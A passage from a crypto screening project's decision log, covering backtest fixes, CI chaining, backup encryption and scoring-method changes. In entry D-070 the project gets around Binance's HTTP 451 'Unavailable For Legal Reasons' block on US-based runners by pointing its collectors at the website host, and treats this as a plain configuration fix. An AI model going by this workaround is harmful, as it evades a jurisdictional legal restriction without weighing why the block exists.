  `draw_controls` returns the journalled controls when a day has any.
- The harness drew its own controls, excluding its top 15 where the journal
  excludes its top 25. It now uses `draw_controls` too.
- A journal run that found no ranking or no BTC price returned 0 and exited
  clean, so healthchecks.io was pinged for a day that can never be written later.
  `journal` now exits 1 when the day holds no entries.

---

## D-063 — Backtest metrics that mean what they say

**Date:** 2026-09-15 · **Status:** accepted

- **Equity curve.** Each run date's 30-day return was compounded as if the
  periods ran one after another, counting each month about thirty times. Entries
  are now at least one horizon apart.
- **Split.** No gap between development and holdout, so development trades
  exited inside the holdout. Development dates within one horizon of the holdout
  are dropped.
- **Sortino.** It divided by the standard deviation of the losses among
  themselves. It now uses downside deviation over every return.
- **Signal gate.** `MIN_SIGNALS` counted every Layer 2 row, which one day of ~200
  survivors met. It counts rows inside the reported top 15.
- **Slippage.** Charged on entry only. Exits cross the book too, at the depth on
  file on the exit date.

---

## D-064 — Publish bakes the newest screen, and refuses an empty one

**Date:** 2026-09-15 · **Status:** accepted

`publish` defaulted to today. A screen run under another date (a backfill, a
manual dispatch) or a screen that had failed left today with no `layer1_result`
rows, so publish baked a universe of zero, pruned every asset page to match, and
stamped it with a fresh `generated_at_utc` -- which, with `run_date` also today,
kept the stale banner silent. **Rule.** With no `--date`, publish bakes the newest
screen on file; a date with no screen results is refused with exit 1; and the
asset directory is never pruned against an empty set.

Two shape fixes in the asset files: event rows now carry every field `EventRow`
declares (without `event_id`, two events on one day shared a React key), and
Layer 3's `setup_detected`, `break_confirmed` and `retest_confirmed` are booleans,
as they already were in `latest.json`.

---

## D-065 — Ops tooling that is safe and complete

**Date:** 2026-09-15 · **Status:** accepted

- **Backup.** `backtest_run`, the holdout audit log, was not in `TABLE_ORDER`, so a
  restore silently reset the count of holdout looks. And the dump held only
  INSERTs, so its own restore instruction failed with "no such table". It now
  writes the schema first and covers every table; a test compares the list with
  `schema.sql`.
- **`migrate --verify`.** The append-only probe deleted a real journal row and
  counted whether it survived -- safe only if the answer was the one nobody yet
  knew. It now probes a scratch table with an identical trigger, drops it, and
  separately checks the journal's triggers are installed.
- **`doctor`.** "Consecutive failures" counted failures among the last 30 runs of
  all collectors together. It now counts each collector's own unbroken streak.
- **Secrets.** `HEALTHCHECK_SUPPLY` was used by two workflows but declared nowhere;
  `HEALTHCHECK_SCREEN` was missing from `.env.example`. Both are declared, with the
  new `HEALTHCHECK_SITE`.
- **Daemon.** `scripts/run_collectors.py` used the 5-minute interval for every tier.
  Each tier now runs at its own cadence (fast 5 min, hourly 60, daily and supply
  once a day).

---

## D-066 — The dashboard finds every asset page, and draws every outcome

**Date:** 2026-09-15 · **Status:** accepted

- **Asset lookup.** The detail page looked its file up in `latest.json`, which
  lists only the ranked head, and otherwise re-derived a name with a sanitiser
  that differs from the publisher's. A rejected non-Latin ticker linked to a file
  that never existed. The page now reads `manifest.json` `asset_files`, which maps
  every screened ticker; while the index loads it shows "Loading", not an error;
  if no manifest is published it falls back to the plain ticker name.
- **Histogram.** Buckets ran from -100% to +1000%. A return vs BTC goes below -100%
  when the asset collapses while BTC rises, so the worst outcomes were not drawn.
  The first and last buckets are now open-ended.
- **Formatting.** Thresholds render as written in `thresholds.yaml` (30,000,000,
  not 30000000.0000); "Below ATH" shows a positive figure under a label that
  already says "below"; a missing return vs BTC is muted, not coloured as a loss.
- **Types.** `market.ath_date` is a string; `Manifest` is typed.

---

## D-067 — The chain runs itself, end to end

**Date:** 2026-09-16 · **Status:** accepted

- **The journal moved into `screen.yml`** as a `needs: screen` job. As its own
  workflow it needed a second external trigger, timed by hand to land after the
  screen; any screen that ran later than that guess lost the day, and a skipped
  journal day can never be written afterwards. It is `continue-on-error`, like
  the supply job in `collect-daily` (D-045), because `publish` triggers on this
  workflow's conclusion and a journal gap must not also cost the day's
  dashboard. The missed `HEALTHCHECK_JOURNAL` ping is the signal. `journal.yml`
  stays the manual re-run path.
- **`screen` only follows a DAILY collect.** `collect-daily` serves both tiers,
  and an hourly run writes derivatives only, so screening it produced a full run
  stamped today from yesterday's prices, market caps and holder readings.
  `workflow_run` carries no inputs, so `collect-daily` reports its tier in
  `run-name` as `collect-daily tier=<tier>` and `screen` matches on
  `tier=daily`. The `tier=` spelling matters: "collect-daily hourly" contains
  the word "daily". The CI guard against interpolating an input into a `run:`
  block now exempts `run-name:`, which is a display string, never a shell script.
- **`HEALTHCHECK_SITE` after the Pages deploy.** The only check that sees the end
  of the chain. Everything upstream can be green while Pages is disabled or the
  deploy is rejected, and the site then serves old data with nothing amiss.
- **`build-site` on pushes to `main` only.** Pages serves one site, so a push to
  a feature branch deployed that branch's dashboard over the live one.
- **The report is committed.** `reports/<date>.md` was written only as a side
  effect of the Telegram step, on a runner that is then discarded, so `reports/`
  held nothing unless Telegram was configured. The publish job now writes it and
  commits it beside the JSON.
- **One date rule.** The report, the Telegram summary and the publisher all
  default to the newest screen on file rather than to today (extends D-064).
- **`CRYPTOPANIC_AUTH_TOKEN` reaches `collect-hourly`**, which is the tier that
  runs `news`; and `asset_contracts` now sends the CoinGecko key its origin
  lookups are rate-limited without (D-054).
- **The backup stops being public.** A release asset on a public repo is public,
  and the dump is the whole database including the journal and the holdout audit
  log. It is encrypted with `BACKUP_PASSPHRASE` (gpg, AES256) before release;
  with no passphrase there is no release, only a 30-day artifact and a warning.
- **CI builds the dashboard.** A `web` job runs `npm ci`, `tsc --noEmit` and the
  same `npm run build` as `build-site`, which used to be found failing only
  after `publish` had committed the day's data.

---

## D-068 — Four findings from reviewing the session's own diff

**Date:** 2026-09-16 · **Status:** accepted

- **A kline close is never overwritten by a CoinGecko price.** `price_daily` is
  keyed on `(snapshot_date, base_asset)` with no `source`, and two collectors
  write it. In the daily tier klines runs last, so the row ends up tagged
  `binance_klines` -- but a later re-run of `coingecko` alone (a retry after a
  rate limit, an operator re-running one collector) flipped the row back. Every
  `entry_close` and `horizon_close` lookup filters on `source='binance_klines'`
  (D-047), so that row became invisible: the day's journal entry stayed pending
  forever, with no error anywhere, and bars that had been collected quietly left
  the sample. `writes.PREFERRED_SOURCE` now keeps the authoritative row on
  conflict. A corrected kline close still lands; only a different source loses.
- **The Coinalyze bar window reads either unit.** The unit of `t` is undocumented
  and the previous code assumed milliseconds (D-049), the new code seconds.
  Either assumption fails identically and silently: a stamp in the other unit is
  ~1000x the window, so no bar matches, every asset is skipped, and the source
  looks dead rather than mis-parsed. The stamp is normalised instead of assumed.
- **No unencrypted dump leaves the backup runner.** With no `BACKUP_PASSPHRASE`
  the run still uploaded the plaintext dump as a build artifact -- and on a
  public repo any signed-in account can download a run's artifacts, so the
  exposure the encryption was added to close stayed open on exactly the path a
  missing secret takes. The run now deletes the dump, errors and exits 1.
- **The tier marker is an allow-list, anchored.** `tier` was free text and
  `screen` matched it with `contains`, so a dispatch of
  `tier=hourly-but-tier=daily-x` carried the daily marker inside its title and
  would have let an hourly collect trigger a screen. `tier` is now a `choice`,
  and the guard uses `endsWith`.

Found by review agents reading the branch diff, not by a failing test; each one
now has the test that would have caught it.


## D-069 — A write tally was labelled "Rows"

**Date:** 2026-09-16 · **Status:** accepted

`table_stats.row_count` exists so the Health page never has to run a metered
`SELECT COUNT(*)` over a time-series table (spec 15.1.5). It is maintained on
write: `row_count = row_count + excluded.row_count`. An upsert that overwrites a
row already counted increments it again, so the figure only ever grows and
drifts further from the truth on every re-run. Measured 2026-09-16 against a
verified dump: **713,934 for `price_daily` against 357,121 actual rows.**

The column was headed **Rows**, with a screen-reader caption of "Row counts and
last write per table", and `_bump_stats` claimed it was "labelled that way in
the UI" -- which it was not. A number that looks like a measurement but is a
write tally is the same class of defect as the rest of this session: nothing
errors, and the page reads as a census.

The counter is unchanged -- it is the right cheap signal, and an exact count is
what Turso's metering forbids. Only the name changes: the column is **Writes**,
the caption and the surrounding note say what it counts, and the schema comment
no longer answers "how many rows do we have?" with it. An exact census belongs
in a restored dump, where reads are free.

Two other fixes found by loading the deployed site and reading it:

- **`history.json` had no reader.** Published on every run with a 90-day funnel
  series, typed in `types.ts`, loaded by an exported `getHistory` -- and called
  from nowhere. No route, no link. The Screen page asserts a 20-50% design band
  while the series that would show drift toward its edge shipped publicly and
  rendered nowhere. It is now a "Funnel history" section on the Health page,
  which colours any run that fell outside the band. The band itself moves to one
  definition, `SURVIVAL_BAND` in `lib/data.ts`, because a threshold duplicated
  in prose on one page and in a comparison on another is a threshold that drifts
  quietly.
- **The two Screen selects had no `id`/`name`.** Their accessible name comes
  from the wrapping `<label>`, so screen readers were fine, but Chrome flags the
  pair on every load. Added.

Found by verifying the first successful deploy in the browser rather than by a
failing test. The write-tally semantics now have one.


## D-070 — The Binance hosts are the website host, because the API hosts are 451 from CI

**Date:** 2026-09-16 · **Status:** accepted

The first live `collect-daily` failed, and it failed for a reason no test could
have caught: `fapi.binance.com` and `api.binance.com` return **HTTP 451
Unavailable For Legal Reasons** to GitHub's runners, which egress from Azure US.
The same endpoints return 200 from a laptop in a permitted region, so every
local run and every test passed while the only environment that matters was
locked out. Four collectors died at once -- `binance_universe`, `binance_spot`,
`binance_klines`, `binance_derivatives` -- which is every input the screen needs.

The run history makes the scale of it plain: **every** Binance success ever
recorded is dated 2026-09-09/10, from local runs. Binance had never once
succeeded on a runner. The 2026-09-11 cancellation hid it, and the baseline read
it as "the chain has never completed end to end".

Binance's own USD-M docs list only `fapi.binance.com`, and the developer forum
thread on this exact error concludes that the spot workarounds
(`data-api.binance.vision`, `api.binance.us`) do not work for futures and that
the only fix is egressing from a permitted region. Both are wrong about the
alternative. Measured on runner 52.165.101.57, all inside one second:

| URL | from the runner |
|---|---|
| `fapi.binance.com/fapi/v1/exchangeInfo` | **451** |
| `api.binance.com/api/v3/ticker/24hr` | **451** |
| `www.binance.com/fapi/v1/exchangeInfo` | **200** (1.1 MB) |
| `www.binance.com/fapi/v1/premiumIndex` | **200** |
| `www.binance.com/fapi/v1/openInterest` | **200** |
| `www.binance.com/fapi/v1/klines` | **200** |
| `www.binance.com/api/v3/ticker/24hr` | **200** |

The block is per **host**, not per path: the website host proxies the same REST
surface. And this project already depended on that fact without noticing --
`binance_announcements` has always pointed at `www.binance.com/bapi/...`, and on
the day the four collectors returned 451 it was the one Binance call that
returned 200 OK. The evidence was in the failing run's own log.

So `binance_futures` and `binance_spot` both become `https://www.binance.com`.
Every affected collector already reads
`self.config.settings.endpoints["binance_futures"]`, so this is two lines of
configuration and no code. It also unifies the two environments: the website
host answers 200 locally too, so CI and a laptop now take the same path instead
of one working by accident of geography.

**Rejected alternatives.** A proxy *on* Actions is useless -- it egresses from
the same blocked IP. An external proxy in a permitted region would work
(`httpx.AsyncClient` is built without `trust_env=False`, so `HTTPS_PROXY` alone
would do it, with no code change) but costs money and adds a secret and a
failure mode, for a problem a config line solves. A self-hosted runner is a real
security exposure on a public repository. The public data archive
(`data.binance.vision/data/futures/um/daily/...`, confirmed 200 from the runner)
carries klines and open-interest `metrics` and stays the fallback if the website
host is ever closed -- but it is T+1 and has no `exchangeInfo`, so the universe
would lose `onboardDate` and status, taking `L1_AGE` and `L1_PERP_SPOT` with it.

**Watch for.** The rate limits stay as they are (`binance_futures: 1200/min`),
but the klines collector issues one request per symbol -- 528 today -- through a
host whose published limits do not cover this use. If the website host
rate-limits or challenges that, D-046's error ceiling fails the run loudly
rather than recording a success over a partial fetch, which is exactly the
behaviour that made this failure legible in the first place.

Three tests: no endpoint may name a geo-blocked host, both Binance hosts must be
the website host, and no module may hardcode a blocked host behind the config.

---

## D-071 — The protocol map is verified by CoinGecko id, and parents sum their children

**Date:** 2026-09-19 · **Status:** accepted

The fundamental block (weight 35, the largest) was scoring **9 of 158** ranked
assets. Two causes, one of them a defect.

**The defect.** DefiLlama lists only a parent protocol's *children*:
`/protocols` and `/overview/fees` carry `aave-v3`, `aave-v2`, … each with
`parentProtocol: "parent#aave"`, and no row called `aave`. Thirteen of the 28
entries in `config/protocol_map.yaml` named a parent by its bare slug —
aave, uniswap, pendle, ethena, gmx, raydium, pancakeswap, synthetix,
compound-finance, makerdao, chainlink, balancer, 1inch-network — and matched
nothing. The collector wrote `has_fundamentals = 0` for them without a word, so
AAVE, UNI, CAKE and COMP scored the block None every day while looking mapped.
Run against the old file, the new verifier reported **24 problems in 28 rows**:
the 13 dead parents, 9 children mapped where the parent is the token's protocol
(`curve-dex`, `aerodrome-v1`, `hyperliquid-perps`, …), and 2 slugs that are not
DefiLlama protocols at all.

**The fix.** A map value of the form `parent#<slug>` sums the parent's
children — TVL (less any child DefiLlama marks `excludeTvlFromParent`) and each
fees/revenue field, over the children that report it. A mapping that resolves
to nothing now raises a warning (`defillama_mapping_unresolved`, run → partial)
instead of scoring None in silence.

**The map is generated, not hand-written.** `scripts/verify_protocol_map.py`
applies one rule to every screened asset with a CoinGecko id:

1. *Identity*: a DefiLlama entry whose `gecko_id` equals the asset's CoinGecko
   id — the id the coingecko collector resolved, not the ticker, so a ticker
   collision cannot attach another project's revenue. A child resolves to its
   parent. In every accepted row DefiLlama's `symbol` also equals the ticker,
   so this is strictly stronger than the check the file used to ask for.
2. *Substance*: non-zero 30-day fees or revenue. A TVL-only entry would turn
   the whole weight-35 block into a TVL rank — the weakest metric in it, and a
   capital snapshot rather than activity — so it is not mapped.
3. *No rival*: two live entries claiming one coin are skipped (FLOW: the Flow
   chain and FlowSwap both cite `gecko_id: flow`).

Result: **157 verified rows** (was 28, of which 4 worked), `--check` clean.
Each row carries its evidence — name, gecko_id, 30-day fees and revenue, date.
`--check` exits non-zero on any row that stops verifying; run it before
hand-editing the file.

**Chains are in.** Where DefiLlama attributes chain fees to a coin (BTC, SOL,
TRX, ADA, AVAX, APT, …) the chain is the protocol. Price-to-sales across L1s
and applications is how DefiLlama and Token Terminal present it; a chain with
$9 of monthly fees simply ranks at the bottom of P/S, which is true.

**Known gaps, not fixed here.** `active_addresses_24h` still has no writer, so
that component is always None. And the renormalisation inside the block means
an asset with only fee data is scored on fees alone; see the active-screener
plan for the coverage fix that applies to every block.

---

## D-072 — Net issuance replaces three supply metrics that had no writer

**Date:** 2026-09-19 · **Status:** accepted

`score_supply` read five inputs. Three — `emissions_trajectory`,
`burned_pct_of_total`, `staked_ratio` — came from `supply_metrics`, and **no
collector ever wrote that table**. It was created, backed up, migrated and read
every morning, and it was always empty. The block therefore reduced to the
float ratio (circulating / total), on which the 36 fully-circulating survivors
tie at exactly 84.49, plus a days-since-unlock figure 19 of 158 assets had.
The metrics still appeared in every asset's published `percentiles` as nulls,
which reads as "measured, unavailable today" rather than "never built".

**What replaces them.** Net issuance: circulating-supply growth over the last
90 days, annualised, from CoinGecko's own supply history; and its trajectory
(falling / flat / rising against the previous 90 days, ±2 points).

- *Why circulating growth and not a schedule.* DefiLlama's emissions datasets
  end at their last documented day, so an open-ended inflation (RPL, ~5%/yr)
  reads as zero future emission; its `burned` series exists for a handful of
  tokens (BNB yes, CAKE no). Measured circulating supply covers every asset
  CoinGecko prices, and it is **net**: a burn is negative issuance, so burned
  share needs no metric of its own. Staked share has no reliable free source
  at all.
- *The source.* `/coins/{id}/market_chart?interval=daily` gives market cap and
  price at 00:00 UTC; their ratio reproduces the `circulating_supply` CoinGecko
  reports on `/coins/markets` (RPL identical to every digit, BNB within
  0.001%, 2026-09-19). So each asset is backfilled once, 365 days in one call,
  into `supply_history`, and extended every day from the `market_snapshot` row
  the coingecko collector already wrote — the same measurement, at no API cost.
  `supply_backfill` records which id each asset was backfilled from; a changed
  id is a different coin and is backfilled again, and every backfill is
  refreshed after 30 days to heal any day the extension missed.
- *Noise.* CoinGecko revises a figure and reverts it a day later often enough
  to matter (CAKE 2026-02-11: +17.8%, −15.1% next day). Each end of a window is
  a 7-day median, never a single reading. A revision that sticks is scored as
  issuance, which is usually what it is.

Live dry run on 2026-09-19 (no write): BTC **+0.83%/yr** — the post-halving
issuance rate — BNB −4.8% (burns), XRP +5.5% (escrow releases), trajectory
flat for all three.

**Weights inside the block:** net issuance 3.0, trajectory 1.5, days since
the last major unlock 2.0, float ratio 1.5; the overhang-cleared bonus is
unchanged. `burned_pct` and `staked_ratio` are removed from scoring and from
the published percentiles. Their columns stay in the schema, commented as
unpopulated, because a column cannot be dropped everywhere this runs.

**Where it runs.** Last in the `supply` tier, after `asset_contracts`, so the
two never share CoinGecko's per-minute budget. 150 backfills per run at
10/min is ~15 minutes inside the supply job's 90; the screened universe is
covered in about four runs, yesterday's survivors first. Steady state is ~18
calls a day. The supply steps now receive `COINGECKO_API_KEY`: keyless, a
runner's shared IP is throttled far below 10/min.

**Journal consequence.** Scores change method on the day this deploys. The
journal is four days old, so the break costs almost nothing now and more every
day it waits; it should be recorded against the run date it lands on.

---

## D-073 — Sectors come from CoinGecko categories, by a fixed precedence

**Date:** 2026-09-19 · **Status:** accepted

69 of the 158 ranked survivors were `unclassified`, including eight of the
top ten (ONT, KAVA, MINA, THETA, HOT, CHZ, LPT, MASK, XEC). Their sector block
scored None and its weight went to supply and drawdown, which is half of why
the same fully-circulating, far-below-ATH coins led every day.

**Source.** CoinGecko's own category membership, read in bulk from
`/coins/markets?category=<id>`: about 45 calls for 31 categories, instead of
one per coin. Keyless per-coin lookups ran at about one a minute under
CoinGecko's throttle; the bulk read finished in minutes.

**Rule** (`scripts/propose_sectors.py`, repeatable): an asset takes the first
of the eleven curated sectors whose categories it belongs to, most specific
first — memecoin, privacy, exchange (**CEX tokens only**: CoinGecko's
exchange-based list includes DEX tokens such as BNT and ZRX), oracle →
infrastructure (TRB, RED, UMA carry DeFi or RWA tags too), rwa, depin,
gaming, ai, defi, l2, an explicit Layer 1 tag, generic infrastructure, then
smart-contract-platform / bitcoin-fork / payments → l1.

**Four overrides**, each choosing between labels CoinGecko itself gives the
coin, with the reason inline in the YAML: RVN, ASTR, LUNC and ONE go to `l1`
(base chains CoinGecko also tags RWA, L2, DeFi or gaming). The script refuses
an override onto a category CoinGecko does not list.

**No new sectors.** Fan tokens (CHZ's peers SANTOS, OG, ASR, FIGHT, ALPINE)
and SocialFi (STEEM, HIVE) would each form a sector that almost never indexes:
one fan token and one SocialFi coin survived on 2026-09-19, against
`min_members_for_index: 3`. CHZ therefore takes its CoinGecko Layer 1 tag.

**Result:** 312 screened assets gained a sector. 53 stay unclassified because
CoinGecko gives them no category in this taxonomy — **MASK among them**
(ecosystem and portfolio tags only), plus BAT, ENS, SYN, EDU, USDC and the
fan tokens. That is the file's own rule working: a null is honest, a guess is
not. Existing curated rows were not touched.

## D-074 — Open interest may confirm price and flow in Pulse, never lead; funding stays risk-only

**Date:** 2026-09-19 · **Status:** accepted (owner) · **Amends:** D-002 · **Revises:** D-015 (bar-level flow)

D-002 said derivatives are a risk check, never a buy trigger. The owner accepted
one narrow exception for the hourly Pulse score: "order flow and price-volume
trends are extremely essential in liquidity driven assets like crypto". Open
interest may **raise** a Pulse score only as a *conditioner* of price and taker
flow that already agree. It never raises one by itself. Funding never raises a
score at all. The Gem score, Layer 1 and Layer 3 are unchanged: D-002 still
holds there in full.

**Why.** The literature supports order flow (Anastasopoulos et al., J. Financial
Markets 2026) and price-volume trend (Fieberg et al., JFQA 2025; Liu,
Tsyvinski & Wu, JF 2022) as directional signals. No study found supports
standalone OI change as one. OI build-ups do predict *fragility* (Oct 10–11
2025, ~$19B liquidated; TRB, the D-002 case). So OI is allowed to say "new
money is behind this move" and nothing more.

**The mapping** (`src/pulse/features.py::oi_quadrant`, 4H and 24H). OI change is
measured in **contracts** (`oi_contracts`), never notional: notional moves with
price, and a "rising OI" that is only a rising price confirms price with itself.

| Price (vs own-sigma flat band) | OI (vs `oi_flat_change`) | Taker flow | Quadrant | Score |
|---|---|---|---|---:|
| up | up | buying (> 0) | confirm_long | 100 |
| up | up | not buying | neutral | 50 |
| up | down | any | short_covering | 50 |
| up | flat | any | neutral | 50 |
| down | up | selling (< 0) | new_shorts | 0 |
| down | up | not selling | neutral | 50 |
| down | down | any | long_liquidation | 0 |
| flat | up and ≥ `extreme_own_pctile` of own history | any | leverage_build | 25 |
| flat | anything else | any | neutral | 50 |

"Flat price" is |return| < `no_move_sigma` × the asset's own sigma at that
horizon (std of 1H log returns over `zscore_lookback_days`, × √hours).
Only the 24H quadrant enters the `oi_confirm` component (weight 10 of 100);
the 4H quadrant is published as a feature.

**Where OI and funding may lower a score.**
- R1 crowding (×`crowding_multiplier`): funding > 0 and at or above its own
  `extreme_own_pctile`, AND the 24h OI change at or above its own
  `extreme_own_pctile` and a real rise (≥ `oi_flat_change`).
- R2 leverage without a move (×`leverage_no_move_multiplier`): the same OI
  condition with |24h return| < `no_move_sigma` × own 24h sigma. The TRB shape.
- Both multiply when both apply.

**Guarded by test, not by review** (`tests/test_pulse_signals.py`):
- `test_oi_alone_never_raises_a_score`: 16 seeded scenarios, run end to end
  through compute_features and score_pulse. Price and flow are held fixed, and
  the scenarios where both are already positive are skipped. OI rising 0.5–50%
  or falling 2–20% never scores above flat OI.
- `test_funding_never_raises_a_score`: 12 scenarios × 5 funding regimes,
  including deeply negative funding (the TRB misreading). The score with
  funding is never above the score without it.

**Known interaction with D-075.** Under D-075 a live component that an asset
lacks contributes 0. So an asset with *no* OI data scores 0 on `oi_confirm`,
while one with flat OI scores 50. That rewards having data, not rising OI. It
is the owner's missing-data rule working as intended. If OI is dark for fewer
than `live_min_assets` assets, the component drops out for everyone.

**D-015, revised for bars.** Binance's kline `taker_buy_quote` is flagged by
aggressor on the exchange and summed per bar. So bar-level flow,
(2·taker_buy − volume) / volume, is an honest measurement and not the
close-location proxy D-015 rejected. D-015 still stands for tick-level CVD.

## D-075 — Missing data scores nothing

**Date:** 2026-09-19 · **Status:** accepted (the owner's decision)

**Context.** `Layer2Scorer.score()` renormalised each asset's total over the
blocks *that asset* had, and `_combine()` did the same over metrics inside a
block. A missing block therefore handed its weight to the blocks that were
measured. That rewarded missing data. A coin measured on two strong blocks
outranked one measured on five, and on the 2026-09-19 screen **10 of the top 15**
were scored on supply and drawdown alone
(`docs/PLAN_ACTIVE_SCREENER.md` §1). The plan proposed a neutral fill at 50.
The owner rejected it: *"Don't let missing data score anything, it's just
manipulating and inflating a coin's potential."* A 50 is still a score for
something nobody measured.

**Decision.**

- **Live blocks.** A block is live in a run when it has a non-null score for
  at least `layer2.live_min_assets` (5) survivors. Then
  `total = Σ_live w_b · score_b / Σ_live w_b`, and a missing live block
  contributes **0**. A block below the floor is *dark* and drops out for
  everyone at once. So a universally dark source (attention, while
  LunarCrush stays unpaid) neither reorders the ranking nor deflates every
  absolute score by its weight.
- **Live metrics.** The same rule applies inside every block (`_combine`). A
  live metric the asset lacks contributes 0, and a dark metric drops out for
  everyone. A block with no live metric measured for the asset stays
  **None**, so the row still says "unmeasured" and never "measured 0". It
  earns 0 at the composite.
- **Small universes.** With fewer than 5 survivors, the floor is the whole
  universe (`live_floor`). There, a block measured for 1 of 3 assets is not a
  cross-section.
- **Coverage.** Per asset, coverage is the live-block weight measured divided
  by the total live-block weight. It is persisted to `layer2_result.coverage`
  and published. `blocks_available` now counts measured *live* blocks,
  because a reading on a dark block moved nothing.
- **Unscorable.** An asset measured on no live block has a NaN total and is
  omitted, as before. It is never written as a score of 0.

**Audit of every other path** (each judgement is commented in
`src/screening/layer2_score.py`):

| Path | Finding | Judgement |
|---|---|---|
| `_weighted_mean` | Renormalising helper with no caller anywhere | Removed |
| Unlock-overhang bonus (+25 supply) | Added to a NaN supply, it stays NaN | Kept. It lifts measured supply only, and the flag alone can never produce a supply score |
| Monitoring tag | Forces events to 0 | Kept. The tag *is* a measurement, so a tagged asset counts as measured on events |
| `positive_catalyst` (100-or-NaN) | **Inflation.** Renormalised, an asset whose only events reading was a catalyst scored events 100 | Fixed by the metric rule: a catalyst now adds its third of the block (33.3) and its absence earns 0. With fewer than 5 known catalysts the metric is dark, like any other |
| Sector `unclassified` → NaN | Under renormalisation, sector weight flowed to the asset's other blocks | Now earns 0. D-073 mapped most top-ranked coins, and the 53 left unclassified are honest nulls |
| Attention `MIN_GATED_EXTREMES` (3) | Superseded in practice by the live floor (5) on any real universe | Kept as the percentile's own guard. A gated-out asset earns 0 on the z metric, which is exactly "contributes nothing". The block is dark while unpaid (the owner's call) |
| `has_fundamentals == 0` mask | Can only remove a reading | Kept. A non-revenue token now earns 0 on a live fundamental block, as the owner's rule requires |
| `active_addresses` metric | `active_addresses_24h` has no writer (DefiLlama writes a literal `None`), so the metric was None for every asset | Metric removed (plan 0.6). The column stays |

**Consequences.**

- Absolute totals fall for thinly measured coins, and the ranking now favours
  breadth of evidence. Weight is only redistributed when a block is dark for
  *everyone*.
- The module's WHY header said the opposite ("a None redistributes weight")
  and has been rewritten.
- Existing tests that encoded renormalisation were updated. Each change is
  explained in its docstring.
- `config/thresholds.yaml` line 62 still carries the old one-line comment
  ("renormalise over the remaining blocks"), just above the D-077 comment that
  supersedes it. It was left alone because config is a shared scaffold file.
  It should be deleted when these entries are folded into DECISIONS.md.
- This is a method change, so it ships as `gem-v2` (D-076).

**Evidence.** `tests/test_gem_v2.py::TestMissingDataScoresNothing` is the
plan's acceptance test: a 2-block asset cannot outrank an otherwise identical
5-block one, and the old formula is reproduced to show it did. The same file
covers:
- a block dark for everyone changing neither the order nor the absolute scores;
- a sub-floor block with a few readings;
- coverage arithmetic;
- the unscorable path;
- `TestMetricLevelLiveRule`, the metric-level rule plus the catalyst, tag,
  overhang and `active_addresses` audits.

## D-076 — Every score says which method made it, and cohorts never blend

**Date:** 2026-09-19 · **Status:** accepted

**Context.** The scoring method changed three times in one week: D-071, D-072
and D-073, then D-075 and D-077. Nothing stored recorded which method produced
a row. `journal --report` pooled every entry into one distribution, so a
return earned under one method was counted as evidence for another. The
journal is the only component that produces truth, and blending cohorts would
quietly let an old method's record vouch for a new one.

**Decision.**

- `layer2_result.score_version` is stamped on every row by `run_layer2`, from
  `thresholds.layer2.score_version`, which is now `gem-v2`.
- `journal_entry.score_version` is stamped on every entry, using the
  version of the **ranking it came from** (read from its `layer2_result`
  row), not today's config. A late or repeated journal run over an older
  ranking therefore cannot relabel its method. Controls take their day's
  version, because they are that cohort's control. The table stays
  append-only: the value is written once, at insert.
- A NULL version is a row written before stamping began, and reads as
  `gem-v1` everywhere (SQL `COALESCE`, `LEGACY_SCORE_VERSION`).
- **Evaluation is per cohort.** `compute_statistics(horizon, score_version)`
  reads exactly one cohort. The default is the current method, because that
  is the one a reader is deciding whether to trust. There is deliberately no
  "all cohorts" call. `journal --report` renders one section per cohort, the
  current method first.
- `journal.json`:
  - `statistics` is the current cohort;
  - `statistics_by_version` holds every cohort;
  - `score_version` names the current method;
  - each entry carries its `score_version`.
- `latest.json` and each asset JSON carry `score_version`.

**Consequences.**

- On the day gem-v2 deploys, the current cohort has no completed returns, and
  the journal page and report say "not enough data" for it. The gem-v1
  record stays visible under its own name. This is intended: the old record
  is evidence about the old method only. The dashboard's journal page should
  read `statistics_by_version` if it wants to show the older cohort.
- Every future change to weights, windows or metric definitions bumps
  `score_version` with a D-number, per plan §7. A version is never edited
  in place.
- The backtest harness's cross-check still compares journal and harness
  returns across all dates. That is a price-path agreement test, not an
  evaluation of a method, so blending there is harmless. Its attached
  `journal_statistics` is the current cohort.

**Evidence.** `tests/test_gem_v2.py::TestScoreVersionCohorts` covers:
- stamping from the ranking, with the legacy ranking recorded as gem-v1;
- statistics that do not leak across cohorts;
- the report grouped by version;
- `cli journal --report`.

`TestPublishedContract::test_journal_json_splits_statistics_by_version` covers
the published file.

## D-077 — A momentum and flow block in the Gem score, from complete daily bars

**Date:** 2026-09-19 · **Status:** accepted (weights proposed in plan §5.3)

**Context.** Every Gem input is a slow, 7-to-90-day quantity. The ranking was
0.945 rank-correlated between 09-16 and 09-19, so nothing in the score could
move overnight (plan §1). The literature supports a medium-horizon trend and
flow signal in the crypto cross-section:
- **Liu, Tsyvinski & Wu** (J. Finance 2022): momentum is one of three crypto
  factors.
- **Fieberg et al.** (JFQA 2025): CTREND, a price and volume trend across
  horizons, holds over 3,000+ coins after costs, including large liquid ones.
- **Anastasopoulos, Gradojevic, Liu, Maynard & Tsiakas** (J. Financial
  Markets 2026): order flow predicts the cross-section of 82 coins, with a
  permanent effect.

**Decision.** A seventh block, `momentum` (weight 20; the weights are now
fundamental 30, supply 20, momentum 20, sector 10, events 10, attention 10,
drawdown 10). All metrics are cross-sectional and higher is better. The
component weights live in code, like every other block:

| Metric | Weight | Definition |
|---|---|---|
| `flow_7d` | 2.0 | (2·Σ taker buy − Σ volume) / Σ volume over the last 7 complete daily bars. All 7 must carry taker volume |
| `vamom_7d` | 1.5 | 7-day return / (std of the last 30 daily log returns · √7) |
| `vamom_30d` | 1.0 | 30-day return / (std of the last 60 daily log returns · √30) |
| `trend_1d` | 1.0 | EMA20/EMA50 on closes: 100 when close > EMA20 > EMA50 and EMA20 is rising, 0 for the mirror, else 50. Needs ≥ 60 bars. Used as a state, not ranked |

- **Complete bars only.** Daily klines close at 23:59:59.999 UTC. The screen
  runs at about 03:10 UTC after collect-daily, and the klines collector
  never writes a forming bar. The newest complete bar is therefore
  `run_date − 1`. Bars are read strictly before `run_date` and from
  `source = 'binance_klines'` only. The `run_date` row is excluded: it is
  either CoinGecko's 03:10 point-in-time price or, on a re-screen, a bar
  that closed after the screen. Every metric also requires the
  `run_date − 1` bar itself. If klines missed yesterday and CoinGecko's
  close-only row sits there, the asset is unmeasured rather than scored on
  a stale series. One query loads 90 days for all survivors.
- **Tolerance.** A volatility window needs 80% of its daily returns. That
  way one missed collection day does not blank a coin for two months, and
  a young listing is not scored on half a window. Zero volatility yields
  no reading.
- **Data.** `price_daily.taker_buy_usd` is Binance kline index 10, taker buy
  **quote** volume (index 9 is base units; the layout matches the documented
  spot `/api/v3/klines` array). It is stored un-divided, like
